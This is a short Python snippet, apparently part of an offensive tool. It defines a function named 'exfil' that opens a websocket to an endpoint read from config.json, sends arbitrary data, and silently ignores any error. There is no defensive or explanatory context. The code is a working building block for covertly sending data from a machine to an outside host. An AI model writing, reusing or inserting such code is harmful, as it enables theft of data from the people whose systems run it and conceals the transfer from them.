import websocket
import json
with open("config.json") as f:
    CONFIG = json.load(f)

def exfil(data):
    try:
        ws = websocket.create_connection(CONFIG['websocket_endpoint'], timeout=5)
        ws.send(data)
        ws.close()
    except: pass